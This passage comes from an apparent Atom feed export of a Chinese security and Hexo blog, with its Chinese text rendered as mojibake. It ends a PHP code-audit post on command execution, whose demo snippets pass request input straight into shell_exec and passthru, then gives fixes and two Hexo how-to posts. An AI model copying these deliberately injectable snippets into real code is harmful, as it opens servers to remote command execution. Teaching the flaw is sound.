src="/2021/4050625683/image-20211224155751521.png" alt="image-20211224155751521"> </p><blockquote><p> %26æ˜¯&amp;çš„urlencode ç¼–ç </p></blockquote><h3 id="6-shell-exec"><a href="#6-shell-exec" class="headerlink" title="6.shell_exec()"></a>6.shell_exec()</h3><p>shell_exec() å‡½æ•°é€šè¿‡shellæ‰§è¡Œå‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼Œè¾“å‡ºå‘½ä»¤è¿”å›ç»“æœçš„å®Œæ•´å­—ç¬¦ä¸²ã€‚</p><p>åœ¨ Linux ä¸‹æ–°å»º test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(shell_exec(<span class="string">&quot;ls&quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224161426089.png" alt="image-20211224161426089"> </p><h3 id="7-passthru"><a href="#7-passthru" class="headerlink" title="7.passthru()"></a>7.passthru()</h3><p>passthru()å‡½æ•°è°ƒç”¨å‚æ•°æŒ‡å®šçš„å‘½ä»¤ï¼ŒæŠŠå‘½ä»¤è¿è¡Œçš„ç»“æœåŸæ ·åœ°è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Š</p><p>windowsä¸‹æ–°å»º test3.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">passthru(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/4050625683/image-20211224172026715.png" alt="image-20211224172026715"> </p><h2 id="0x03-ä¿®å¤å»ºè®®"><a href="#0x03-ä¿®å¤å»ºè®®" class="headerlink" title="0x03 ä¿®å¤å»ºè®®"></a>0x03 ä¿®å¤å»ºè®®</h2><ol><li>ä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥çš„æ•°æ®ï¼Œç¦æ­¢æ‰§è¡Œéé¢„æœŸç³»ç»Ÿå‘½ä»¤ã€‚</li><li>å‡å°‘æˆ–ä¸ä½¿ç”¨ä»£ç æˆ–å‘½ä»¤æ‰§è¡Œå‡½æ•°</li><li>å®¢æˆ·ç«¯æäº¤çš„å˜é‡åœ¨æ”¾å…¥å‡½æ•°å‰è¿›è¡Œæ£€æµ‹</li><li>å‡å°‘æˆ–ä¸ä½¿ç”¨å±é™©å‡½æ•°</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>åœ¨å®¡è®¡ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ—¶ï¼Œä¸»è¦çš„æ¼æ´ç‚¹ï¼Œè¿˜æ˜¯å‡½æ•°æœ¬èº«ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æœç´¢çš„æ–¹å¼æ¥æœç´¢å‡½æ•°ï¼Œåˆ†æä»£ç ï¼Œçœ‹å…¶æ˜¯å¦è¿‡æ»¤ï¼Œç„¶åé€šè¿‡å‡½æ•°çš„ç‰¹å¾ï¼Œè¿›è¡Œæ„é€ payload ç»•è¿‡ï¼Œæ˜¯å¦èƒ½å‘½ä»¤æ‰§è¡Œ/ä»£ç æ‰§è¡Œã€‚</p><p>å‚è€ƒ</p><p><a href="https://www.php.net/manual/zh/index.php">https://www.php.net/manual/zh/index.php</a></p><p><a href="https://www.anquanke.com/post/id/229611#h3-1">https://www.anquanke.com/post/id/229611#h3-1</a></p><p><a href="https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_5">https://www.cnblogs.com/iAmSoScArEd/p/10651947.html#auto_id_5</a></p>]]></content>
    
    
    <summary type="html">ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œçš„æ¦‚è¿°ï¼Œä»£ç å®¡è®¡ä¸­æ‰€ä½¿ç”¨åˆ°çš„å‡½æ•°ï¼Œä»¥åŠå‡½æ•°çš„æ„é€ payloadçš„æ–¹æ³•ã€‚</summary>
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://fz1lin.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHP" scheme="https://fz1lin.com/tags/PHP/"/>
    
    <category term="RCE" scheme="https://fz1lin.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Hexo å†™ä½œæ¸…å•</title>
    <link href="https://fz1lin.com/2021/2056430684/"/>
    <id>https://fz1lin.com/2021/2056430684/</id>
    <published>2021-12-01T10:59:41.000Z</published>
    <updated>2021-12-22T11:54:56.236Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Hexoæ–‡ç« ç®¡ç†"><a href="#0x01-Hexoæ–‡ç« ç®¡ç†" class="headerlink" title="0x01 Hexoæ–‡ç« ç®¡ç†"></a>0x01 Hexoæ–‡ç« ç®¡ç†</h2><h3 id="1-åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶"><a href="#1-åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶" class="headerlink" title="1.åˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶"></a>1.åˆ›å»ºä¸€ä¸ª<a href="https://www.zhihu.com/search?q=md%E6%96%87%E4%BB%B6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22article%22,%22sourceId%22:156915260%7D">mdæ–‡ä»¶</a></h3><p>mdæ–‡ä»¶ä¹Ÿå°±æ˜¯<code>Markdown</code>æ–‡ä»¶ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new &lt;title&gt;</span><br><span class="line">hexo new <span class="string">&quot;æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç« &quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-å¸ƒå±€ï¼ˆlayoutï¼‰"><a href="#2-å¸ƒå±€ï¼ˆlayoutï¼‰" class="headerlink" title="2.å¸ƒå±€ï¼ˆlayoutï¼‰"></a>2.å¸ƒå±€ï¼ˆlayoutï¼‰</h3><ul><li>åˆ›å»ºmdæ–‡ä»¶æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šå¸ƒå±€</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">new</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;$</span> <span class="string">hexo</span> <span class="string">new</span> <span class="string">page</span> <span class="string">&quot;æˆ‘çš„é¡µé¢&quot;</span></span><br></pre></td></tr></table></figure><ul><li>å¸ƒå±€æœ‰ä¸‰ç§ï¼š<code>post</code>ï¼ˆæ–‡ç« ï¼‰ã€<code>draft</code>ï¼ˆè‰ç¨¿ï¼‰ã€<code>page</code>ï¼ˆé¡µé¢ï¼‰</li></ul><p>åœ¨æ–°å»ºæ–‡ä»¶æ—¶ï¼ŒHexo ä¼šæ ¹æ® <code>scaffolds</code> æ–‡ä»¶å¤¹å†…ç›¸å¯¹åº”çš„æ–‡ä»¶ï¼ˆå¯ä»¥ç†è§£ä¸ºæ¨¡æ¿ï¼‰æ¥å»ºç«‹mdæ–‡ä»¶ï¼š</p><h3 id="3-è‰ç¨¿ï¼ˆdraftï¼‰"><a href="#3-è‰ç¨¿ï¼ˆdraftï¼‰" class="headerlink" title="3.è‰ç¨¿ï¼ˆdraftï¼‰"></a>3.è‰ç¨¿ï¼ˆdraftï¼‰</h3><p><code>draft</code>è¿™ç§å¸ƒå±€åœ¨å»ºç«‹æ—¶ä¼šè¢«ä¿å­˜åˆ° <code>source/_drafts</code> æ–‡ä»¶å¤¹ä¸­ï¼Œä½†ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³æŸä¸€ç¯‡æ–‡ç« æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œé‚£ä¹ˆå°±å¯ä»¥æŠŠå®ƒç§»åŠ¨åˆ°<code>_drafts</code>æ–‡ä»¶å¤¹ä¸­ã€‚</p><ul><li>æˆ‘ä»¬å¯åœ¨å¯åŠ¨æœåŠ¡å™¨æ—¶åŠ ä¸Š <code>--draft</code> å‚æ•°æ¥æŸ¥çœ‹è‰ç¨¿ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">server</span> <span class="string">--draft</span></span><br></pre></td></tr></table></figure><ul><li>è¿˜å¯ä»¥åœ¨ç«™ç‚¹é…ç½®æ–‡ä»¶ä¸­æŠŠ <code>render_drafts</code> å‚æ•°è®¾ä¸º <code>true</code> æ¥é¢„è§ˆè‰ç¨¿ã€‚</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>publish</code> å‘½ä»¤å°†è‰ç¨¿å‘å¸ƒæ–‡ç« æˆ–è€…é¡µé¢ï¼Œå®ƒå°†ä¼šè¢«ç§»åŠ¨åˆ°æŒ‡å®šçš„æ–‡ä»¶å¤¹ã€‚</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">publish</span> [<span class="string">layout</span>] <span class="string">&lt;title&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-æ¦‚è¿°æ–‡ç« "><a href="#0x02-æ¦‚è¿°æ–‡ç« " class="headerlink" title="0x02 æ¦‚è¿°æ–‡ç« "></a>0x02 æ¦‚è¿°æ–‡ç« </h2><h3 id="æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°"><a href="#æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°" class="headerlink" title="æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°"></a>æ–¹æ³•ä¸€ï¼šå†™æ¦‚è¿°</h3><p>åœ¨å¯¹åº”æ–‡ç« å¯¹ <code>front-matter</code>ï¼ˆæ–‡ç« æ–‡ä»¶æœ€ä¸Šæ–¹ä»¥ <code>---</code>åˆ†å‰²å¯¹åŒºåŸŸï¼Œæ˜¯ç”¨æ¥æŒ‡å®šä¸ªåˆ«æ–‡ä»¶çš„é…ç½®å˜é‡åŒºåŸŸï¼‰ä¸­æ·»åŠ <code>description</code>å˜é‡ï¼Œå…¶ä¸­<code>description</code>å˜é‡è®¾ç½®çš„å†…å®¹å°±ä¼šè¢«æ˜¾ç¤ºåœ¨é¦–é¡µä¸Šé—¨ï¼Œå…¶ä½™çš„æ–‡æ¡ˆä¸€å¾‹ä¸æ˜¾ç¤ºã€‚é…ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span> <span class="string">å†™ä½œæ¸…å•</span></span><br><span class="line"><span class="attr">categories:</span>  <span class="string">Hexo</span>   <span class="string">//åˆ†ç±»</span></span><br><span class="line"><span class="attr">tags:</span>               <span class="string">//æ ‡ç­¾</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">å†™ä½œåšå®¢çš„æµç¨‹</span>   <span class="string">//æ¦‚è¿°</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€ç§æ–¹æ³•æ˜¯éœ€è¦è‡ªå·±å†™æ¦‚è¿°ï¼Œæ‰€ä»¥æ¯”è¾ƒè´¹äº‹ï¼Œäºæ˜¯å°±æœ‰äº†ç¬¬äºŒç§æ–¹æ³•ã€‚</p><h3 id="æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º"><a href="#æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º" class="headerlink" title="æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º"></a>æ–¹æ³•äºŒï¼šæ–‡ç« æˆªæ–­æ˜¾ç¤º</h3><p>è¿™ç§æ–¹æ³•åªéœ€è¦åœ¨å¯¹åº”çš„æ–‡ç« é‡Œï¼Œæƒ³è¦å±•ç¤ºçš„æ–‡ç« åæ·»åŠ ä»¥ä¸‹æ ‡ç­¾å°±å¯ä»¥äº†</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&lt;!--more--&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åé¦–é¡µå°±ä¼šæ˜¾ç¤ºåœ¨è¿™ä¸ªæ ‡ç­¾ä»¥ä¸Šçš„æ‰€æœ‰å†…å®¹ï¼Œéšè—æ–‡ç« ä¸‹é¢çš„æ‰€æœ‰å†…å®¹ã€‚ </p><h2 id="0x03-Front-matter-é¢„å®šè®¾ç½®"><a href="#0x03-Front-matter-é¢„å®šè®¾ç½®" class="headerlink" title="0x03 Front-matter é¢„å®šè®¾ç½®"></a>0x03 Front-matter é¢„å®šè®¾ç½®</h2><table><thead><tr><th>é…ç½®é€‰é¡¹</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> çš„æ–‡ä»¶æ ‡é¢˜</td><td>æ–‡ç« æ ‡é¢˜ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹</td></tr><tr><td>date</td><td>æ–‡ä»¶åˆ›å»ºæ—¶çš„æ—¥æœŸæ—¶é—´</td><td>å‘å¸ƒæ—¶é—´ï¼Œå¼ºçƒˆå»ºè®®å¡«å†™æ­¤é€‰é¡¹ï¼Œä¸”æœ€å¥½ä¿è¯å…¨å±€å”¯ä¸€</td></tr><tr><td>author</td><td>æ ¹ <code>_config.yml</code> ä¸­çš„ <code>author</code></td><td>æ–‡ç« ä½œè€…</td></tr><tr><td>img</td><td><code>featureImages</code> ä¸­çš„æŸä¸ªå€¼</td><td>æ–‡ç« ç‰¹å¾å›¾ï¼Œæ¨èä½¿ç”¨å›¾åºŠ(è…¾è®¯äº‘ã€ä¸ƒç‰›äº‘ã€åˆæ‹äº‘ç­‰)æ¥åšå›¾ç‰‡çš„è·¯å¾„.å¦‚: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>æ¨èæ–‡ç« ï¼ˆæ–‡ç« æ˜¯å¦ç½®é¡¶ï¼‰ï¼Œå¦‚æœ <code>top</code> å€¼ä¸º <code>true</code>ï¼Œåˆ™ä¼šä½œä¸ºé¦–é¡µæ¨èæ–‡ç« </td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« æ˜¯å¦éœ€è¦åŠ å…¥åˆ°é¦–é¡µè½®æ’­å°é¢ä¸­</td></tr><tr><td>coverImg</td><td>æ— </td><td><code>v1.0.2</code>ç‰ˆæœ¬æ–°å¢ï¼Œè¡¨ç¤ºè¯¥æ–‡ç« åœ¨é¦–é¡µè½®æ’­å°é¢éœ€è¦æ˜¾ç¤ºçš„å›¾ç‰‡è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä½¿ç”¨æ–‡ç« çš„ç‰¹è‰²å›¾ç‰‡</td></tr><tr><td>password</td><td>æ— </td><td>æ–‡ç« é˜…è¯»å¯†ç ï¼Œå¦‚æœè¦å¯¹æ–‡ç« è®¾ç½®é˜…è¯»éªŒè¯å¯†ç çš„è¯ï¼Œå°±å¯ä»¥è®¾ç½® <code>password</code> çš„å€¼ï¼Œè¯¥å€¼å¿…é¡»æ˜¯ç”¨ <code>SHA256</code> åŠ å¯†åçš„å¯†ç ï¼Œé˜²æ­¢è¢«ä»–äººè¯†ç ´ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>verifyPassword</code> é€‰é¡¹</td></tr><tr><td>toc</td><td><code>true</code></td><td>æ˜¯å¦å¼€å¯ TOCï¼Œå¯ä»¥é’ˆå¯¹æŸç¯‡æ–‡ç« å•ç‹¬å…³é—­ TOC çš„åŠŸèƒ½ã€‚å‰ææ˜¯åœ¨ä¸»é¢˜çš„ <code>config.yml</code> ä¸­æ¿€æ´»äº† <code>toc</code> é€‰é¡¹</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>æ˜¯å¦å¼€å¯æ•°å­¦å…¬å¼æ”¯æŒ ï¼Œæœ¬æ–‡ç« æ˜¯å¦å¼€å¯ <code>mathjax</code>ï¼Œä¸”éœ€è¦åœ¨ä¸»é¢˜çš„ <code>_config.yml</code> æ–‡ä»¶ä¸­ä¹Ÿéœ€è¦å¼€å¯æ‰è¡Œ</td></tr><tr><td>summary</td><td>æ— </td><td>æ–‡ç« æ‘˜è¦ï¼Œè‡ªå®šä¹‰çš„æ–‡ç« æ‘˜è¦å†…å®¹ï¼Œå¦‚æœè¿™ä¸ªå±æ€§æœ‰å€¼ï¼Œæ–‡ç« å¡ç‰‡æ‘˜è¦å°±æ˜¾ç¤ºè¿™æ®µæ–‡å­—ï¼Œå¦åˆ™ç¨‹åºä¼šè‡ªåŠ¨æˆªå–æ–‡ç« çš„éƒ¨åˆ†å†…å®¹ä½œä¸ºæ‘˜è¦</td></tr><tr><td>categories</td><td>æ— </td><td>æ–‡ç« åˆ†ç±»ï¼Œæœ¬ä¸»é¢˜çš„åˆ†ç±»è¡¨ç¤ºå®è§‚ä¸Šå¤§çš„åˆ†ç±»ï¼Œåªå»ºè®®ä¸€ç¯‡æ–‡ç« ä¸€ä¸ªåˆ†ç±»</td></tr><tr><td>tags</td><td>æ— </td><td>æ–‡ç« æ ‡ç­¾ï¼Œä¸€ç¯‡æ–‡ç« å¯ä»¥å¤šä¸ªæ ‡ç­¾</td></tr><tr><td>keywords</td><td>æ–‡ç« æ ‡é¢˜</td><td>æ–‡ç« å…³é”®å­—ï¼ŒSEO æ—¶éœ€è¦</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>æ–‡ç« è½¬è½½è§„åˆ™ï¼Œ å¯ä»¥æ˜¯ cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint æˆ– pay ä¸­çš„ä¸€ä¸ª</td></tr></tbody></table><h3 id="1-ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾"><a href="#1-ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾" class="headerlink" title="1.ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾"></a>1.ä¸ºæ–‡ç« æ·»åŠ åˆ†ç±»ä¸æ ‡ç­¾</h3><p>åªæœ‰æ–‡ç« ï¼ˆpostå¸ƒå±€ï¼‰æ”¯æŒåˆ†ç±»å’Œæ ‡ç­¾ï¼Œéœ€è¦åœ¨<code>Front-matter</code>ä¸­è®¾ç½®ã€‚åˆ†ç±»æœ‰å±‚çº§å…³ç³»ï¼Œæ ‡ç­¾æ²¡æœ‰ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š<br>1ï¼‰ä¸‹é¢æ–‡ç« å®ƒçš„æ ‡ç­¾æ˜¯ï¼šHexoã€åšå®¢<br>2ï¼‰åˆ†ç±»æ˜¯ï¼š ä¸ªäººåšå®¢ &gt; Hexoåšå®¢<br>3ï¼‰â€œHexoåšå®¢â€ æ˜¯ â€œä¸ªäººåšå®¢â€ çš„å­åˆ†ç±»</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">ä¸ªäººåšå®¢ï¼ˆç¬¬ä¸€å±‚çº§ï¼‰</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexoåšå®¢ï¼ˆç¬¬äºŒå±‚çº§ï¼‰</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">Hexo</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">åšå®¢</span></span><br></pre></td></tr></table></figure><h3 id="2-ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»"><a href="#2-ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»" class="headerlink" title="2.ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»"></a>2.ä¸ºæ–‡ç« æ·»åŠ å¤šä¸ªåˆ†ç±»</h3><p>1ï¼‰ä¸‹é¢æ–‡ç« å±äºä¸‰ä¸ªåˆ†ç±»ï¼šæ—¥å¸¸ &gt; ç”Ÿæ´»ï¼Œæ—¥å¸¸ &gt; éšæƒ³ï¼Œæ—¥è®°<br>2ï¼‰å…¶ä¸­ç”Ÿæ´»ã€éšæƒ³ä¸ºæ—¥å¸¸çš„å­åˆ†ç±»ï¼Œæ—¥å¸¸å’Œæ—¥è®°ä¸ºåŒçº§åˆ†ç±»</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">categories:</span></span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥å¸¸</span>, <span class="string">ç”Ÿæ´»</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥å¸¸</span>, <span class="string">éšæƒ³</span>]</span><br><span class="line"><span class="bullet">-</span> [<span class="string">æ—¥è®°</span>]</span><br></pre></td></tr></table></figure><h2 id="0x03-éƒ¨ç½²å‘½ä»¤"><a href="#0x03-éƒ¨ç½²å‘½ä»¤" class="headerlink" title="0x03 éƒ¨ç½²å‘½ä»¤"></a>0x03 éƒ¨ç½²å‘½ä»¤</h2><h3 id="åŸºæœ¬æ“ä½œ"><a href="#åŸºæœ¬æ“ä½œ" class="headerlink" title="åŸºæœ¬æ“ä½œ"></a>åŸºæœ¬æ“ä½œ</h3><ul><li>æ¸…é™¤ç¼“å­˜ï¼š<code>hexo clean</code></li><li>ç”Ÿæˆé™æ€æ–‡ä»¶ï¼š<code>hexo generate</code>å¯ç®€å†™ä¸º <code>hexo g</code></li><li>å¯åŠ¨æœåŠ¡å™¨ï¼š<code>hexo server</code>æˆ–è€… <code>hexo s</code> å¸¸ç”¨å‚æ•°ï¼š<code>-pï¼ˆ--portï¼‰</code>é‡è®¾ç«¯å£</li><li>éƒ¨ç½²ï¼š<code>hexo deploy</code>å¯ç®€å†™ä¸º<code>hexo d</code>ï¼Œç”¨äºå°†ç½‘ç«™éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šã€‚ï¼ˆæš‚æ—¶ç”¨ä¸åˆ°ï¼Œç›®å‰éƒ½æ˜¯åœ¨æœ¬åœ°ï¼Œåé¢æˆ‘ä»¬å°†åšå®¢æ‰˜ç®¡åˆ°<code>GitHub Pages</code>æˆ–<code>Gitee Pages</code>æ—¶æ‰ä¼šç”¨åˆ°æ­¤å‘½ä»¤ï¼‰<br>å¸¸ç”¨å‚æ•°ï¼š<code>-gï¼ˆ--generateï¼‰</code>ï¼Œ<code>hexo d -g</code>éƒ¨ç½²å‰é¢„å…ˆç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œç­‰åŒäº <code>hexo g -d</code></li></ul><p>å‘å¸ƒæ–‡ç« æˆ–è€…ä¿®æ”¹åšå®¢åæ‰§è¡Œæµç¨‹ï¼š</p><p>æ¸…é™¤ç¼“å­˜&gt;ç”Ÿæˆé™æ€æ–‡ä»¶&gt;å¯åŠ¨æœåŠ¡å™¨ï¼Œæµ‹è¯•æ²¡é—®é¢˜åå†éƒ¨ç½²ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// æˆ‘ä»¬å¯ä»¥å†™æˆä¸€æ¡å‘½ä»¤</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">Hexo å†™ä½œæµç¨‹çš„æ¦‚è¿°ï¼ŒåŒ…å«äº†å‘½ä»¤ï¼Œè®¾ç½®ç­‰</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
    <category term="blog" scheme="https://fz1lin.com/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>Hexo å›¾ç‰‡å­˜æ”¾çš„é—®é¢˜</title>
    <link href="https://fz1lin.com/2021/448087847/"/>
    <id>https://fz1lin.com/2021/448087847/</id>
    <published>2021-12-03T02:02:32.000Z</published>
    <updated>2021-12-22T11:54:24.994Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä½¿ç”¨ typoraï¼Œé»˜è®¤ä¸Šä¼ æœåŠ¡å™¨æ˜¯æ‰¾ä¸åˆ°å›¾ç‰‡çš„ï¼Œæ‰€ä»¥è¦å¼€å¯è¯¥åŠŸèƒ½</p><h2 id="é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"><a href="#é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶"></a>é…ç½®ç«™ç‚¹é…ç½®æ–‡ä»¶</h2><p>æ˜¯æ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> çš„é…ç½®æ–‡ä»¶</p><p>æœç´¢</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">post_asset_folder:true</span></span><br></pre></td></tr></table></figure><p>åœ¨åšå®¢æ ¹ç›®å½•ä¸‹ï¼Œå®‰è£…æ’ä»¶</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">npm</span> <span class="string">install</span> <span class="string">https://github.com/CodeFalling/hexo-asset-image</span> <span class="string">--save</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥å°†typoraçš„è·¯å¾„æ”¹ä¸º</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./$&#123;filename&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/448087847/image-20211203100700456.png" alt="image-20211203100700456"> </p><p>ä¿®æ”¹æˆåŠŸå </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">s</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæ–‡ç« ä¼šåœ¨ <code>source/_posts</code>ç›®å½•ä¸‹åˆ›å»ºåŒåæ–‡ä»¶å¤¹å’ŒåŒåçš„.md æ–‡ä»¶</p>]]></content>
    
    
    <summary type="html">å¦‚æœä½¿ç”¨ typoraï¼Œé»˜è®¤ä¸Šä¼ æœåŠ¡å™¨æ˜¯æ‰¾ä¸åˆ°å›¾ç‰‡çš„ï¼Œæ‰€ä»¥è¦å¼€å¯è¯¥åŠŸèƒ½</summary>
    
    
    
    <category term="Hexo-about" scheme="https://fz1lin.com/categories/Hexo-about/"/>
    
    
    <category term="Hexo" scheme="https://fz1lin.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>PHPä»£ç å®¡è®¡-æ–‡ä»¶ç±»å‹æ¼æ´</title>
    <link href="https://fz1lin.com/2021/2734680967/"/>
    <id>https://fz1lin.com/2021/2734680967/</id>
    <published>2021-12-19T11:31:49.000Z</published>
    <updated>2021-12-19T11:35:47.096Z</updated>
    
